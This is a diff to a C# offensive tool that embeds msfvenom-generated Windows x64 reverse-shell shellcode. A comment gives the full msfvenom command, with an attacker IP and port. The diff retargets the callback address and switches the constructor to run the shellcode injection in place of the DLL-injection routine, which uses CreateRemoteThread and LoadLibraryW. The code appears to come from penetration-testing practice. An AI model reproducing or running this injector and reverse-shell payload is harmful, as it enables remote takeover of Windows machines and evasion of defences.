@@ -7,7 +7,7 @@ namespace cevsn
     public class Privsn
     {
         /*
-            Shellcode with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.68.131 LPORT=1331 -e x64/zutto_dekiru -f csharp -o test.cs
+            Shellcode with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.62.131 LPORT=1331 -e x64/zutto_dekiru -f csharp -o test.cs
         */
         byte[] buf = new byte[514] {
         0xda,0xc4,0x4d,0x31,0xff,0x41,0xb7,0x3a,0x48,0x89,0xe1,0x48,0xbf,0xc9,0x05,
@@ -106,8 +106,8 @@ namespace cevsn
 
         public Privsn()
         {
-            //injectShellcode();
-            injectDLL();
+            injectShellcode();
+            //injectDLL();
         }
 
         public void injectShellcode()
@@ -161,6 +161,7 @@ namespace cevsn
             IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
 
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+            
         }
 
         public void injectDLLReflective()
